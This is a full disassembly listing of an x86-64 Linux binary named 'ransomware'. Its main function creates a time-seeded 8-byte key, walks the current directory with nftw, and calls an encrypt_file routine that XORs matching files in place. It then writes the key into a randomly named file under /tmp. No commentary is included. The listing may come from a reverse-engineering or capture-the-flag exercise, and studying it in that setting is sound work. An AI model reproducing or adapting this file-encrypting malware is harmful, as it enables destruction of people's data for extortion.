
ransomware:     file format elf64-x86-64


Disassembly of section .init:

0000000000001000 <.init>:
    1000:       f3 0f 1e fa             endbr64
    1004:       48 83 ec 08             sub    rsp,0x8
    1008:       48 8b 05 d9 2f 00 00    mov    rax,QWORD PTR [rip+0x2fd9]        # 3fe8 <__gmon_start__@Base>
    100f:       48 85 c0                test   rax,rax
    1012:       74 02                   je     1016 <__strcat_chk@plt-0x1a>
    1014:       ff d0                   call   rax
    1016:       48 83 c4 08             add    rsp,0x8
    101a:       c3                      ret

Disassembly of section .plt:

0000000000001020 <__strcat_chk@plt-0x10>:
    1020:       ff 35 22 2f 00 00       push   QWORD PTR [rip+0x2f22]        # 3f48 <dummy+0x29c8>
    1026:       ff 25 24 2f 00 00       jmp    QWORD PTR [rip+0x2f24]        # 3f50 <dummy+0x29d0>
    102c:       0f 1f 40 00             nop    DWORD PTR [rax+0x0]

0000000000001030 <__strcat_chk@plt>:
    1030:       ff 25 22 2f 00 00       jmp    QWORD PTR [rip+0x2f22]        # 3f58 <__strcat_chk@GLIBC_2.3.4>
    1036:       68 00 00 00 00          push   0x0
    103b:       e9 e0 ff ff ff          jmp    1020 <__strcat_chk@plt-0x10>

0000000000001040 <nftw@plt>:
    1040:       ff 25 1a 2f 00 00       jmp    QWORD PTR [rip+0x2f1a]        # 3f60 <nftw@GLIBC_2.3.3>
    1046:       68 01 00 00 00          push   0x1
    104b:       e9 d0 ff ff ff          jmp    1020 <__strcat_chk@plt-0x10>

0000000000001050 <puts@plt>:
    1050:       ff 25 12 2f 00 00       jmp    QWORD PTR [rip+0x2f12]        # 3f68 <puts@GLIBC_2.2.5>
    1056:       68 02 00 00 00          push   0x2
    105b:       e9 c0 ff ff ff          jmp    1020 <__strcat_chk@plt-0x10>

0000000000001060 <fread@plt>:
    1060:       ff 25 0a 2f 00 00       jmp    QWORD PTR [rip+0x2f0a]        # 3f70 <fread@GLIBC_2.2.5>
    1066:       68 03 00 00 00          push   0x3
    106b:       e9 b0 ff ff ff          jmp    1020 <__strcat_chk@plt-0x10>

0000000000001070 <fclose@plt>:
    1070:       ff 25 02 2f 00 00       jmp    QWORD PTR [rip+0x2f02]        # 3f78 <fclose@GLIBC_2.2.5>
    1076:       68 04 00 00 00          push   0x4
    107b:       e9 a0 ff ff ff          jmp    1020 <__strcat_chk@plt-0x10>

0000000000001080 <strlen@plt>:
    1080:       ff 25 fa 2e 00 00       jmp    QWORD PTR [rip+0x2efa]        # 3f80 <strlen@GLIBC_2.2.5>
    1086:       68 05 00 00 00          push   0x5
    108b:       e9 90 ff ff ff          jmp    1020 <__strcat_chk@plt-0x10>

0000000000001090 <__stack_chk_fail@plt>:
    1090:       ff 25 f2 2e 00 00       jmp    QWORD PTR [rip+0x2ef2]        # 3f88 <__stack_chk_fail@GLIBC_2.4>
    1096:       68 06 00 00 00          push   0x6
    109b:       e9 80 ff ff ff          jmp    1020 <__strcat_chk@plt-0x10>

00000000000010a0 <getcwd@plt>:
    10a0:       ff 25 ea 2e 00 00       jmp    QWORD PTR [rip+0x2eea]        # 3f90 <getcwd@GLIBC_2.2.5>
    10a6:       68 07 00 00 00          push   0x7
    10ab:       e9 70 ff ff ff          jmp    1020 <__strcat_chk@plt-0x10>

00000000000010b0 <srand@plt>:
    10b0:       ff 25 e2 2e 00 00       jmp    QWORD PTR [rip+0x2ee2]        # 3f98 <srand@GLIBC_2.2.5>
    10b6:       68 08 00 00 00          push   0x8
    10bb:       e9 60 ff ff ff          jmp    1020 <__strcat_chk@plt-0x10>

00000000000010c0 <time@plt>:
    10c0:       ff 25 da 2e 00 00       jmp    QWORD PTR [rip+0x2eda]        # 3fa0 <time@GLIBC_2.2.5>
    10c6:       68 09 00 00 00          push   0x9
    10cb:       e9 50 ff ff ff          jmp    1020 <__strcat_chk@plt-0x10>

00000000000010d0 <fseek@plt>:
    10d0:       ff 25 d2 2e 00 00       jmp    QWORD PTR [rip+0x2ed2]        # 3fa8 <fseek@GLIBC_2.2.5>
    10d6:       68 0a 00 00 00          push   0xa
    10db:       e9 40 ff ff ff          jmp    1020 <__strcat_chk@plt-0x10>

00000000000010e0 <fopen@plt>:
    10e0:       ff 25 ca 2e 00 00       jmp    QWORD PTR [rip+0x2eca]        # 3fb0 <fopen@GLIBC_2.2.5>
    10e6:       68 0b 00 00 00          push   0xb
    10eb:       e9 30 ff ff ff          jmp    1020 <__strcat_chk@plt-0x10>

00000000000010f0 <fwrite@plt>:
    10f0:       ff 25 c2 2e 00 00       jmp    QWORD PTR [rip+0x2ec2]        # 3fb8 <fwrite@GLIBC_2.2.5>
    10f6:       68 0c 00 00 00          push   0xc
    10fb:       e9 20 ff ff ff          jmp    1020 <__strcat_chk@plt-0x10>

0000000000001100 <strstr@plt>:
    1100:       ff 25 ba 2e 00 00       jmp    QWORD PTR [rip+0x2eba]        # 3fc0 <strstr@GLIBC_2.2.5>
    1106:       68 0d 00 00 00          push   0xd
    110b:       e9 10 ff ff ff          jmp    1020 <__strcat_chk@plt-0x10>

0000000000001110 <rand@plt>:
    1110:       ff 25 b2 2e 00 00       jmp    QWORD PTR [rip+0x2eb2]        # 3fc8 <rand@GLIBC_2.2.5>
    1116:       68 0e 00 00 00          push   0xe
    111b:       e9 00 ff ff ff          jmp    1020 <__strcat_chk@plt-0x10>

0000000000001120 <__sprintf_chk@plt>:
    1120:       ff 25 aa 2e 00 00       jmp    QWORD PTR [rip+0x2eaa]        # 3fd0 <__sprintf_chk@GLIBC_2.3.4>
    1126:       68 0f 00 00 00          push   0xf
    112b:       e9 f0 fe ff ff          jmp    1020 <__strcat_chk@plt-0x10>

Disassembly of section .plt.got:

0000000000001130 <__cxa_finalize@plt>:
    1130:       ff 25 c2 2e 00 00       jmp    QWORD PTR [rip+0x2ec2]        # 3ff8 <__cxa_finalize@GLIBC_2.2.5>
    1136:       66 90                   xchg   ax,ax

Disassembly of section .text:

0000000000001140 <main>:
    1140:       41 54                   push   r12
    1142:       55                      push   rbp
    1143:       53                      push   rbx
    1144:       48 81 ec 00 10 00 00    sub    rsp,0x1000
    114b:       48 83 0c 24 00          or     QWORD PTR [rsp],0x0
    1150:       48 81 ec 00 10 00 00    sub    rsp,0x1000
    1157:       48 83 0c 24 00          or     QWORD PTR [rsp],0x0
    115c:       48 83 ec 10             sub    rsp,0x10
    1160:       31 ff                   xor    edi,edi
    1162:       4c 8d 25 af 2e 00 00    lea    r12,[rip+0x2eaf]        # 4018 <dummy+0x2a98>
    1169:       4c 89 e3                mov    rbx,r12
    116c:       49 8d 6c 24 08          lea    rbp,[r12+0x8]
    1171:       64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
    1178:       00 00
    117a:       48 89 84 24 08 20 00    mov    QWORD PTR [rsp+0x2008],rax
    1181:       00
    1182:       31 c0                   xor    eax,eax
    1184:       e8 37 ff ff ff          call   10c0 <time@plt>
    1189:       89 c7                   mov    edi,eax
    118b:       e8 20 ff ff ff          call   10b0 <srand@plt>
    1190:       e8 7b ff ff ff          call   1110 <rand@plt>
    1195:       48 83 c3 01             add    rbx,0x1
    1199:       88 43 ff                mov    BYTE PTR [rbx-0x1],al
    119c:       48 39 eb                cmp    rbx,rbp
    119f:       75 ef                   jne    1190 <main+0x50>
    11a1:       48 89 e5                mov    rbp,rsp
    11a4:       be 00 10 00 00          mov    esi,0x1000
    11a9:       48 89 ef                mov    rdi,rbp
    11ac:       e8 ef fe ff ff          call   10a0 <getcwd@plt>
    11b1:       48 85 c0                test   rax,rax
    11b4:       0f 84 07 01 00 00       je     12c1 <main+0x181>
    11ba:       b9 01 00 00 00          mov    ecx,0x1
    11bf:       ba 0f 00 00 00          mov    edx,0xf
    11c4:       48 89 ef                mov    rdi,rbp
    11c7:       48 8d 35 02 02 00 00    lea    rsi,[rip+0x202]        # 13d0 <encrypt_file>
    11ce:       e8 6d fe ff ff          call   1040 <nftw@plt>
    11d3:       48 8d bc 24 10 10 00    lea    rdi,[rsp+0x1010]
    11da:       00
    11db:       b9 fe 01 00 00          mov    ecx,0x1fe
    11e0:       31 d2                   xor    edx,edx
    11e2:       48 b8 2f 74 6d 70 2f    movabs rax,0x2f706d742f
    11e9:       00 00 00
    11ec:       48 89 94 24 08 10 00    mov    QWORD PTR [rsp+0x1008],rdx
    11f3:       00
    11f4:       48 89 84 24 00 10 00    mov    QWORD PTR [rsp+0x1000],rax
    11fb:       00
    11fc:       31 c0                   xor    eax,eax
    11fe:       f3 48 ab                rep stos QWORD PTR es:[rdi],rax
    1201:       0f 1f 80 00 00 00 00    nop    DWORD PTR [rax+0x0]
    1208:       e8 03 ff ff ff          call   1110 <rand@plt>
    120d:       89 c3                   mov    ebx,eax
    120f:       85 c0                   test   eax,eax
    1211:       7e f5                   jle    1208 <main+0xc8>
    1213:       48 8d ac 24 00 10 00    lea    rbp,[rsp+0x1000]
    121a:       00
    121b:       48 89 ef                mov    rdi,rbp
    121e:       e8 5d fe ff ff          call   1080 <strlen@plt>
    1223:       41 89 d8                mov    r8d,ebx
    1226:       be 01 00 00 00          mov    esi,0x1
    122b:       48 8d 0d df 0d 00 00    lea    rcx,[rip+0xddf]        # 2011 <dummy+0xa91>
    1232:       48 8d 7c 05 00          lea    rdi,[rbp+rax*1+0x0]
    1237:       48 c7 c2 ff ff ff ff    mov    rdx,0xffffffffffffffff
    123e:       31 c0                   xor    eax,eax
    1240:       e8 db fe ff ff          call   1120 <__sprintf_chk@plt>
    1245:       ba 00 10 00 00          mov    edx,0x1000
    124a:       48 89 ef                mov    rdi,rbp
    124d:       48 8d 35 b0 0d 00 00    lea    rsi,[rip+0xdb0]        # 2004 <dummy+0xa84>
    1254:       e8 d7 fd ff ff          call   1030 <__strcat_chk@plt>
    1259:       48 89 ef                mov    rdi,rbp
    125c:       48 8d 35 b1 0d 00 00    lea    rsi,[rip+0xdb1]        # 2014 <dummy+0xa94>
    1263:       e8 78 fe ff ff          call   10e0 <fopen@plt>
    1268:       ba 08 00 00 00          mov    edx,0x8
    126d:       be 01 00 00 00          mov    esi,0x1
    1272:       4c 89 e7                mov    rdi,r12
    1275:       48 89 c1                mov    rcx,rax
    1278:       48 89 c5                mov    rbp,rax
    127b:       e8 70 fe ff ff          call   10f0 <fwrite@plt>
    1280:       48 89 ef                mov    rdi,rbp
    1283:       e8 e8 fd ff ff          call   1070 <fclose@plt>
    1288:       48 8d 3d c9 0d 00 00    lea    rdi,[rip+0xdc9]        # 2058 <dummy+0xad8>
    128f:       e8 bc fd ff ff          call   1050 <puts@plt>
    1294:       48 8d 3d f5 0d 00 00    lea    rdi,[rip+0xdf5]        # 2090 <dummy+0xb10>
    129b:       e8 b0 fd ff ff          call   1050 <puts@plt>
    12a0:       48 8b 84 24 08 20 00    mov    rax,QWORD PTR [rsp+0x2008]
    12a7:       00
    12a8:       64 48 2b 04 25 28 00    sub    rax,QWORD PTR fs:0x28
    12af:       00 00
    12b1:       75 1c                   jne    12cf <main+0x18f>
    12b3:       48 81 c4 10 20 00 00    add    rsp,0x2010
    12ba:       31 c0                   xor    eax,eax
    12bc:       5b                      pop    rbx
    12bd:       5d                      pop    rbp
    12be:       41 5c                   pop    r12
    12c0:       c3                      ret
    12c1:       48 8d 3d 50 0d 00 00    lea    rdi,[rip+0xd50]        # 2018 <dummy+0xa98>
    12c8:       e8 83 fd ff ff          call   1050 <puts@plt>
    12cd:       eb d1                   jmp    12a0 <main+0x160>
    12cf:       e8 bc fd ff ff          call   1090 <__stack_chk_fail@plt>
    12d4:       66 2e 0f 1f 84 00 00    cs nop WORD PTR [rax+rax*1+0x0]
    12db:       00 00 00
    12de:       66 90                   xchg   ax,ax
    12e0:       f3 0f 1e fa             endbr64
    12e4:       31 ed                   xor    ebp,ebp
    12e6:       49 89 d1                mov    r9,rdx
    12e9:       5e                      pop    rsi
    12ea:       48 89 e2                mov    rdx,rsp
    12ed:       48 83 e4 f0             and    rsp,0xfffffffffffffff0
    12f1:       50                      push   rax
    12f2:       54                      push   rsp
    12f3:       45 31 c0                xor    r8d,r8d
    12f6:       31 c9                   xor    ecx,ecx
    12f8:       48 8d 3d 41 fe ff ff    lea    rdi,[rip+0xfffffffffffffe41]        # 1140 <main>
    12ff:       ff 15 d3 2c 00 00       call   QWORD PTR [rip+0x2cd3]        # 3fd8 <dummy+0x2a58>
    1305:       f4                      hlt
    1306:       66 2e 0f 1f 84 00 00    cs nop WORD PTR [rax+rax*1+0x0]
    130d:       00 00 00
    1310:       48 8d 3d f9 2c 00 00    lea    rdi,[rip+0x2cf9]        # 4010 <dummy+0x2a90>
    1317:       48 8d 05 f2 2c 00 00    lea    rax,[rip+0x2cf2]        # 4010 <dummy+0x2a90>
    131e:       48 39 f8                cmp    rax,rdi
    1321:       74 15                   je     1338 <main+0x1f8>
    1323:       48 8b 05 b6 2c 00 00    mov    rax,QWORD PTR [rip+0x2cb6]        # 3fe0 <dummy+0x2a60>
    132a:       48 85 c0                test   rax,rax
    132d:       74 09                   je     1338 <main+0x1f8>
    132f:       ff e0                   jmp    rax
    1331:       0f 1f 80 00 00 00 00    nop    DWORD PTR [rax+0x0]
    1338:       c3                      ret
    1339:       0f 1f 80 00 00 00 00    nop    DWORD PTR [rax+0x0]
    1340:       48 8d 3d c9 2c 00 00    lea    rdi,[rip+0x2cc9]        # 4010 <dummy+0x2a90>
    1347:       48 8d 35 c2 2c 00 00    lea    rsi,[rip+0x2cc2]        # 4010 <dummy+0x2a90>
    134e:       48 29 fe                sub    rsi,rdi
    1351:       48 89 f0                mov    rax,rsi
    1354:       48 c1 ee 3f             shr    rsi,0x3f
    1358:       48 c1 f8 03             sar    rax,0x3
    135c:       48 01 c6                add    rsi,rax
    135f:       48 d1 fe                sar    rsi,1
    1362:       74 14                   je     1378 <main+0x238>
    1364:       48 8b 05 85 2c 00 00    mov    rax,QWORD PTR [rip+0x2c85]        # 3ff0 <dummy+0x2a70>
    136b:       48 85 c0                test   rax,rax
    136e:       74 08                   je     1378 <main+0x238>
    1370:       ff e0                   jmp    rax
    1372:       66 0f 1f 44 00 00       nop    WORD PTR [rax+rax*1+0x0]
    1378:       c3                      ret
    1379:       0f 1f 80 00 00 00 00    nop    DWORD PTR [rax+0x0]
    1380:       f3 0f 1e fa             endbr64
    1384:       80 3d 85 2c 00 00 00    cmp    BYTE PTR [rip+0x2c85],0x0        # 4010 <dummy+0x2a90>
    138b:       75 2b                   jne    13b8 <main+0x278>
    138d:       55                      push   rbp
    138e:       48 83 3d 62 2c 00 00    cmp    QWORD PTR [rip+0x2c62],0x0        # 3ff8 <dummy+0x2a78>
    1395:       00
    1396:       48 89 e5                mov    rbp,rsp
    1399:       74 0c                   je     13a7 <main+0x267>
    139b:       48 8b 3d 66 2c 00 00    mov    rdi,QWORD PTR [rip+0x2c66]        # 4008 <dummy+0x2a88>
    13a2:       e8 89 fd ff ff          call   1130 <__cxa_finalize@plt>
    13a7:       e8 64 ff ff ff          call   1310 <main+0x1d0>
    13ac:       c6 05 5d 2c 00 00 01    mov    BYTE PTR [rip+0x2c5d],0x1        # 4010 <dummy+0x2a90>
    13b3:       5d                      pop    rbp
    13b4:       c3                      ret
    13b5:       0f 1f 00                nop    DWORD PTR [rax]
    13b8:       c3                      ret
    13b9:       0f 1f 80 00 00 00 00    nop    DWORD PTR [rax+0x0]
    13c0:       f3 0f 1e fa             endbr64
    13c4:       e9 77 ff ff ff          jmp    1340 <main+0x200>
    13c9:       0f 1f 80 00 00 00 00    nop    DWORD PTR [rax+0x0]

00000000000013d0 <encrypt_file>:
    13d0:       41 55                   push   r13
    13d2:       41 54                   push   r12
    13d4:       55                      push   rbp
    13d5:       53                      push   rbx
    13d6:       48 83 ec 18             sub    rsp,0x18
    13da:       64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
    13e1:       00 00
    13e3:       48 89 44 24 08          mov    QWORD PTR [rsp+0x8],rax
    13e8:       31 c0                   xor    eax,eax
    13ea:       85 d2                   test   edx,edx
    13ec:       0f 85 d0 00 00 00       jne    14c2 <encrypt_file+0xf2>
    13f2:       49 89 f4                mov    r12,rsi
    13f5:       48 8d 35 08 0c 00 00    lea    rsi,[rip+0xc08]        # 2004 <dummy+0xa84>
    13fc:       48 89 fd                mov    rbp,rdi
    13ff:       89 d3                   mov    ebx,edx
    1401:       e8 fa fc ff ff          call   1100 <strstr@plt>
    1406:       48 85 c0                test   rax,rax
    1409:       0f 84 d0 00 00 00       je     14df <encrypt_file+0x10f>
    140f:       49 8b 44 24 30          mov    rax,QWORD PTR [r12+0x30]
    1414:       48 89 ef                mov    rdi,rbp
    1417:       48 8d 35 f0 0b 00 00    lea    rsi,[rip+0xbf0]        # 200e <dummy+0xa8e>
    141e:       48 85 c0                test   rax,rax
    1421:       4c 8d 60 07             lea    r12,[rax+0x7]
    1425:       4c 0f 49 e0             cmovns r12,rax
    1429:       e8 b2 fc ff ff          call   10e0 <fopen@plt>
    142e:       49 c1 fc 03             sar    r12,0x3
    1432:       48 89 c5                mov    rbp,rax
    1435:       45 89 e5                mov    r13d,r12d
    1438:       48 85 c0                test   rax,rax
    143b:       0f 84 81 00 00 00       je     14c2 <encrypt_file+0xf2>
    1441:       45 85 e4                test   r12d,r12d
    1444:       7e 74                   jle    14ba <encrypt_file+0xea>
    1446:       49 89 e4                mov    r12,rsp
    1449:       eb 55                   jmp    14a0 <encrypt_file+0xd0>
    144b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]
    1450:       f3 0f 7e 04 24          movq   xmm0,QWORD PTR [rsp]
    1455:       ba 01 00 00 00          mov    edx,0x1
    145a:       48 89 ef                mov    rdi,rbp
    145d:       f3 0f 7e 0d b3 2b 00    movq   xmm1,QWORD PTR [rip+0x2bb3]        # 4018 <dummy+0x2a98>
    1464:       00
    1465:       48 c7 c6 f8 ff ff ff    mov    rsi,0xfffffffffffffff8
    146c:       66 0f ef c1             pxor   xmm0,xmm1
    1470:       66 0f d6 04 24          movq   QWORD PTR [rsp],xmm0
    1475:       e8 56 fc ff ff          call   10d0 <fseek@plt>
    147a:       85 c0                   test   eax,eax
    147c:       75 3c                   jne    14ba <encrypt_file+0xea>
    147e:       48 89 e9                mov    rcx,rbp
    1481:       ba 08 00 00 00          mov    edx,0x8
    1486:       be 01 00 00 00          mov    esi,0x1
    148b:       4c 89 e7                mov    rdi,r12
    148e:       e8 5d fc ff ff          call   10f0 <fwrite@plt>
    1493:       48 85 c0                test   rax,rax
    1496:       74 22                   je     14ba <encrypt_file+0xea>
    1498:       83 c3 01                add    ebx,0x1
    149b:       41 39 dd                cmp    r13d,ebx
    149e:       74 1a                   je     14ba <encrypt_file+0xea>
    14a0:       48 89 e9                mov    rcx,rbp
    14a3:       ba 08 00 00 00          mov    edx,0x8
    14a8:       be 01 00 00 00          mov    esi,0x1
    14ad:       4c 89 e7                mov    rdi,r12
    14b0:       e8 ab fb ff ff          call   1060 <fread@plt>
    14b5:       48 85 c0                test   rax,rax
    14b8:       75 96                   jne    1450 <encrypt_file+0x80>
    14ba:       48 89 ef                mov    rdi,rbp
    14bd:       e8 ae fb ff ff          call   1070 <fclose@plt>
    14c2:       48 8b 44 24 08          mov    rax,QWORD PTR [rsp+0x8]
    14c7:       64 48 2b 04 25 28 00    sub    rax,QWORD PTR fs:0x28
    14ce:       00 00
    14d0:       75 27                   jne    14f9 <encrypt_file+0x129>
    14d2:       48 83 c4 18             add    rsp,0x18
    14d6:       31 c0                   xor    eax,eax
    14d8:       5b                      pop    rbx
    14d9:       5d                      pop    rbp
    14da:       41 5c                   pop    r12
    14dc:       41 5d                   pop    r13
    14de:       c3                      ret
    14df:       48 8d 35 23 0b 00 00    lea    rsi,[rip+0xb23]        # 2009 <dummy+0xa89>
    14e6:       48 89 ef                mov    rdi,rbp
    14e9:       e8 12 fc ff ff          call   1100 <strstr@plt>
    14ee:       48 85 c0                test   rax,rax
    14f1:       0f 85 18 ff ff ff       jne    140f <encrypt_file+0x3f>
    14f7:       eb c9                   jmp    14c2 <encrypt_file+0xf2>
    14f9:       e8 92 fb ff ff          call   1090 <__stack_chk_fail@plt>
    14fe:       66 90                   xchg   ax,ax
    1500:       48 8d 15 12 2b 00 00    lea    rdx,[rip+0x2b12]        # 4019 <dummy+0x2a99>
    1507:       48 89 f8                mov    rax,rdi
    150a:       48 29 d0                sub    rax,rdx
    150d:       48 83 f8 06             cmp    rax,0x6
    1511:       76 1d                   jbe    1530 <encrypt_file+0x160>
    1513:       f3 0f 7e 0d fd 2a 00    movq   xmm1,QWORD PTR [rip+0x2afd]        # 4018 <dummy+0x2a98>
    151a:       00
    151b:       f3 0f 7e 07             movq   xmm0,QWORD PTR [rdi]
    151f:       66 0f ef c1             pxor   xmm0,xmm1
    1523:       66 0f d6 07             movq   QWORD PTR [rdi],xmm0
    1527:       c3                      ret
    1528:       0f 1f 84 00 00 00 00    nop    DWORD PTR [rax+rax*1+0x0]
    152f:       00
    1530:       0f b6 05 e1 2a 00 00    movzx  eax,BYTE PTR [rip+0x2ae1]        # 4018 <dummy+0x2a98>
    1537:       30 07                   xor    BYTE PTR [rdi],al
    1539:       0f b6 05 d9 2a 00 00    movzx  eax,BYTE PTR [rip+0x2ad9]        # 4019 <dummy+0x2a99>
    1540:       30 47 01                xor    BYTE PTR [rdi+0x1],al
    1543:       0f b6 05 d0 2a 00 00    movzx  eax,BYTE PTR [rip+0x2ad0]        # 401a <dummy+0x2a9a>
    154a:       30 47 02                xor    BYTE PTR [rdi+0x2],al
    154d:       0f b6 05 c7 2a 00 00    movzx  eax,BYTE PTR [rip+0x2ac7]        # 401b <dummy+0x2a9b>
    1554:       30 47 03                xor    BYTE PTR [rdi+0x3],al
    1557:       0f b6 05 be 2a 00 00    movzx  eax,BYTE PTR [rip+0x2abe]        # 401c <dummy+0x2a9c>
    155e:       30 47 04                xor    BYTE PTR [rdi+0x4],al
    1561:       0f b6 05 b5 2a 00 00    movzx  eax,BYTE PTR [rip+0x2ab5]        # 401d <dummy+0x2a9d>
    1568:       30 47 05                xor    BYTE PTR [rdi+0x5],al
    156b:       0f b6 05 ac 2a 00 00    movzx  eax,BYTE PTR [rip+0x2aac]        # 401e <dummy+0x2a9e>
    1572:       30 47 06                xor    BYTE PTR [rdi+0x6],al
    1575:       0f b6 05 a3 2a 00 00    movzx  eax,BYTE PTR [rip+0x2aa3]        # 401f <dummy+0x2a9f>
    157c:       30 47 07                xor    BYTE PTR [rdi+0x7],al
    157f:       c3                      ret

0000000000001580 <dummy>:
    1580:       cc                      int3
    1581:       cc                      int3
    1582:       cc                      int3
    1583:       cc                      int3
    1584:       cc                      int3
    1585:       cc                      int3
    1586:       cc                      int3
    1587:       cc                      int3
    1588:       cc                      int3
    1589:       cc                      int3
    158a:       cc                      int3
    158b:       cc                      int3
    158c:       cc                      int3
    158d:       cc                      int3
    158e:       cc                      int3
    158f:       cc                      int3
    1590:       cc                      int3
    1591:       cc                      int3
    1592:       cc                      int3
    1593:       cc                      int3
    1594:       cc                      int3
    1595:       cc                      int3
    1596:       cc                      int3
    1597:       cc                      int3
    1598:       cc                      int3
    1599:       cc                      int3
    159a:       cc                      int3
    159b:       cc                      int3
    159c:       cc                      int3
    159d:       cc                      int3
    159e:       cc                      int3
    159f:       cc                      int3
    15a0:       cc                      int3
    15a1:       cc                      int3
    15a2:       cc                      int3
    15a3:       cc                      int3
    15a4:       cc                      int3
    15a5:       cc                      int3
    15a6:       cc                      int3
    15a7:       cc                      int3
    15a8:       cc                      int3
    15a9:       cc                      int3
    15aa:       cc                      int3
    15ab:       cc                      int3
    15ac:       cc                      int3
    15ad:       cc                      int3
    15ae:       cc                      int3
    15af:       cc                      int3
    15b0:       cc                      int3
    15b1:       cc                      int3
    15b2:       cc                      int3
    15b3:       cc                      int3
    15b4:       cc                      int3
    15b5:       cc                      int3
    15b6:       cc                      int3
    15b7:       cc                      int3
    15b8:       cc                      int3
    15b9:       cc                      int3
    15ba:       cc                      int3
    15bb:       cc                      int3
    15bc:       cc                      int3
    15bd:       cc                      int3
    15be:       cc                      int3
    15bf:       cc                      int3
    15c0:       cc                      int3
    15c1:       cc                      int3
    15c2:       cc                      int3
    15c3:       cc                      int3
    15c4:       cc                      int3
    15c5:       cc                      int3
    15c6:       cc                      int3
    15c7:       cc                      int3
    15c8:       cc                      int3
    15c9:       cc                      int3
    15ca:       cc                      int3
    15cb:       cc                      int3
    15cc:       cc                      int3
    15cd:       cc                      int3
    15ce:       cc                      int3
    15cf:       cc                      int3
    15d0:       cc                      int3
    15d1:       cc                      int3
    15d2:       cc                      int3
    15d3:       cc                      int3
    15d4:       cc                      int3
    15d5:       cc                      int3
    15d6:       cc                      int3
    15d7:       cc                      int3
    15d8:       cc                      int3
    15d9:       cc                      int3
    15da:       cc                      int3
    15db:       cc                      int3
    15dc:       cc                      int3
    15dd:       cc                      int3
    15de:       cc                      int3
    15df:       cc                      int3
    15e0:       cc                      int3
    15e1:       cc                      int3
    15e2:       cc                      int3
    15e3:       cc                      int3

Disassembly of section .fini:

00000000000015e4 <.fini>:
    15e4:       f3 0f 1e fa             endbr64
    15e8:       48 83 ec 08             sub    rsp,0x8
    15ec:       48 83 c4 08             add    rsp,0x8
    15f0:       c3                      ret